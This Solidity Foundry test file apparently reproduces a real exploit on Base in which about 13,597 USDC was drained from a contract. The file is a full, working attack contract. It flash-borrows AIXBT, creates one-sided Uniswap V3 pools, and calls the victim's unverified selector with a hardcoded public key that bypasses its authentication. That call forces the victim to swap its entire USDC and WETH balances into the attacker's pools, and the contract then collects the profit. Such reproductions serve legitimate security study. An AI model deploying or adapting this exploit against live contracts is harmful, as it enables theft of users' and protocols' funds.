// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 13,597.36 USDC
// Attacker : 0x312b559b41139c75a75c7ae1ea4454e661a02647
// Attack Contract : 0x4f3a1aebc074ef7a1b3675d7b8d4c5a72d629fac
// Vulnerable Contract : 0x32cd8541ccd275a70dda33a9fd490d948a78e1ff
// Attack Tx : https://basescan.org/tx/0x5a7462b79d6df0048299c229bdca232ea6dcb97d80cd3b512c28e67db2370d47

// @Info
// Vulnerable Contract Code : https://basescan.org/address/0x32cd8541ccd275a70dda33a9fd490d948a78e1ff#code

// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/363
//
// The attacker flash-borrowed AIXBT, created narrow one-sided Uniswap V3 AIXBT pools, and called an
// unverified victim selector that made the victim swap its full USDC and WETH balances into those pools.
// The decompiled victim shows the selector accepts keccak256("1205060227") as an auth bypass, then approves
// its own token balance to the Uniswap router and executes caller-controlled exactInputSingle parameters.
// The attacker withdrew the LP positions, repaid the flash loan, and forwarded the remaining USDC profit.

address constant ATTACKER = 0x312B559b41139c75a75c7aE1ea4454e661a02647;
address constant VULNERABLE_CONTRACT = 0x32cD8541cCD275A70dDA33A9fD490D948A78E1ff;

address constant AIXBT = 0x4F9Fd6Be4a90f2620860d680c0d4d5Fb53d1A825;
address constant BASE_USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
address constant BASE_WETH = 0x4200000000000000000000000000000000000006;
address constant UNISWAP_V3_POSITION_MANAGER = 0x03a520b32C04BF3bEEf7BEb72E919cf822Ed34f1;
address constant UNISWAP_V3_SWAP_ROUTER = 0x2626664c2603336E57B271c5C0b26F421741e481;
address constant AIXBT_USDC_FLASH_POOL = 0xf1Fdc83c3A336bdbDC9fB06e318B08EadDC82FF4;

interface IBaseSwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);

    function exactOutputSingle(
        ExactOutputSingleParams calldata params
    ) external payable returns (uint256 amountIn);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 25_559_856;
        vm.createSelectFork("base", forkBlock);
        fundingToken = BASE_USDC;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(VULNERABLE_CONTRACT, "Victim contract");
        vm.label(AIXBT, "AIXBT");
        vm.label(BASE_USDC, "USDC");
        vm.label(BASE_WETH, "WETH");
        vm.label(UNISWAP_V3_POSITION_MANAGER, "Uniswap V3 position manager");
        vm.label(UNISWAP_V3_SWAP_ROUTER, "Uniswap V3 swap router");
        vm.label(AIXBT_USDC_FLASH_POOL, "AIXBT/USDC flash pool");
    }

    function testExploit() public balanceLog2(ATTACKER) {
        AIXBTForcedSwapExploit exploit = new AIXBTForcedSwapExploit(ATTACKER);

        uint256 attackerBefore = IERC20(BASE_USDC).balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        exploit.attack();

        uint256 profit = IERC20(BASE_USDC).balanceOf(ATTACKER) - attackerBefore;
        emit log_named_decimal_uint("Attacker USDC profit", profit, 6);
        assertGt(profit, 13_000e6, "USDC profit below reported impact");
    }
}

contract AIXBTForcedSwapExploit {
    IERC20 private constant aixbt = IERC20(AIXBT);
    IERC20 private constant usdc = IERC20(BASE_USDC);
    IERC20 private constant weth = IERC20(BASE_WETH);
    INonfungiblePositionManager private constant positionManager =
        INonfungiblePositionManager(UNISWAP_V3_POSITION_MANAGER);
    IBaseSwapRouter private constant swapRouter = IBaseSwapRouter(UNISWAP_V3_SWAP_ROUTER);
    IUniswapV3Flash private constant flashPool = IUniswapV3Flash(AIXBT_USDC_FLASH_POOL);

    // Victim 0x229e9756 auth from decompiler:
    //   key == keccak256("1205060227") || msg.sender == runner || msg.sender == owner
    // Because the key is a public bytecode constant, any caller can make the victim approve tokenIn to
    // the router and swap its own balance into attacker-prepared AIXBT pools.
    bytes4 private constant VICTIM_SWAP_SELECTOR = 0x229e9756;
    bytes32 private constant VICTIM_SWAP_KEY = keccak256("1205060227");

    address private immutable profitReceiver;

    constructor(
        address profitReceiver_
    ) {
        profitReceiver = profitReceiver_;
    }

    function attack() external {
        require(msg.sender == profitReceiver, "only profit receiver");

        // step 1: borrow AIXBT and enter the Uniswap V3 flash callback.
        uint256 flashAmount = 10 ether;
        flashPool.flash(address(this), flashAmount, 0, abi.encode(flashAmount));
    }

    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        require(msg.sender == AIXBT_USDC_FLASH_POOL, "unexpected flash pool");
        require(fee1 == 0, "unexpected token1 fee");

        uint256 flashAmount = abi.decode(data, (uint256));
        aixbt.approve(UNISWAP_V3_POSITION_MANAGER, type(uint256).max);
        usdc.approve(UNISWAP_V3_SWAP_ROUTER, type(uint256).max);
        weth.approve(UNISWAP_V3_SWAP_ROUTER, type(uint256).max);

        // step 2: create two fresh 0.01% pools initialized at a 1:1 sqrt price.
        uint160 sqrtPriceX96 = uint160(1) << 96;
        positionManager.createAndInitializePoolIfNecessary(AIXBT, BASE_USDC, 100, sqrtPriceX96);
        positionManager.createAndInitializePoolIfNecessary(BASE_WETH, AIXBT, 100, sqrtPriceX96);

        // step 3: seed AIXBT/USDC, force the victim's full USDC balance through it, then collect.
        (uint256 aixbtUsdcTokenId, uint128 aixbtUsdcLiquidity,,) =
            _mintPosition(AIXBT, BASE_USDC, 100, 0, 100, aixbt.balanceOf(address(this)), 0);
        _forceVictimSwap(BASE_USDC, usdc.balanceOf(VULNERABLE_CONTRACT));
        _removeAndCollect(aixbtUsdcTokenId, aixbtUsdcLiquidity);

        // step 4: seed WETH/AIXBT, force the victim's full WETH balance through it, then collect.
        (uint256 wethAixbtTokenId, uint128 wethAixbtLiquidity,,) =
            _mintPosition(BASE_WETH, AIXBT, 100, -100, 0, 0, aixbt.balanceOf(address(this)));
        _forceVictimSwap(BASE_WETH, weth.balanceOf(VULNERABLE_CONTRACT));
        _removeAndCollect(wethAixbtTokenId, wethAixbtLiquidity);

        // step 5: top up exact AIXBT owed for the flash loan, then convert collected WETH to USDC.
        uint256 aixbtOwed = flashAmount + fee0;
        uint256 aixbtBalance = aixbt.balanceOf(address(this));
        if (aixbtBalance < aixbtOwed) {
            _swapUsdcForExactAixbt(aixbtOwed - aixbtBalance);
        }
        _swapAllWethToUsdc();

        // step 6: repay the flash pool and forward the remaining USDC to the attacker EOA.
        aixbt.transfer(AIXBT_USDC_FLASH_POOL, aixbtOwed);
        usdc.transfer(profitReceiver, usdc.balanceOf(address(this)));
    }

    function _mintPosition(
        address token0,
        address token1,
        uint24 fee,
        int24 tickLower,
        int24 tickUpper,
        uint256 amount0Desired,
        uint256 amount1Desired
    ) private returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1) {
        (tokenId, liquidity, amount0, amount1) = positionManager.mint(
            INonfungiblePositionManager.MintParams({
                token0: token0,
                token1: token1,
                fee: fee,
                tickLower: tickLower,
                tickUpper: tickUpper,
                amount0Desired: amount0Desired,
                amount1Desired: amount1Desired,
                amount0Min: 0,
                amount1Min: 0,
                recipient: address(this),
                deadline: block.timestamp
            })
        );
    }

    function _removeAndCollect(
        uint256 tokenId,
        uint128 liquidity
    ) private {
        positionManager.decreaseLiquidity(
            INonfungiblePositionManager.DecreaseLiquidityParams({
                tokenId: tokenId, liquidity: liquidity, amount0Min: 0, amount1Min: 0, deadline: block.timestamp
            })
        );
        positionManager.collect(
            INonfungiblePositionManager.CollectParams({
                tokenId: tokenId, recipient: address(this), amount0Max: type(uint128).max, amount1Max: type(uint128).max
            })
        );
    }

    function _forceVictimSwap(
        address tokenIn,
        uint256 amountIn
    ) private {
        (bool ok, bytes memory returndata) = VULNERABLE_CONTRACT.call(
            abi.encodeWithSelector(
                VICTIM_SWAP_SELECTOR, VICTIM_SWAP_KEY, tokenIn, amountIn, AIXBT, uint256(0), uint24(100), uint160(0)
            )
        );
        if (!ok) {
            assembly {
                revert(add(returndata, 0x20), mload(returndata))
            }
        }
    }

    function _swapUsdcForExactAixbt(
        uint256 amountOut
    ) private {
        swapRouter.exactOutputSingle(
            IBaseSwapRouter.ExactOutputSingleParams({
                tokenIn: BASE_USDC,
                tokenOut: AIXBT,
                fee: 10_000,
                recipient: address(this),
                amountOut: amountOut,
                amountInMaximum: usdc.balanceOf(address(this)),
                sqrtPriceLimitX96: 0
            })
        );
    }

    function _swapAllWethToUsdc() private {
        uint256 wethBalance = weth.balanceOf(address(this));
        if (wethBalance == 0) return;

        swapRouter.exactInputSingle(
            IBaseSwapRouter.ExactInputSingleParams({
                tokenIn: BASE_WETH,
                tokenOut: BASE_USDC,
                fee: 3000,
                recipient: address(this),
                amountIn: wethBalance,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );
    }
}
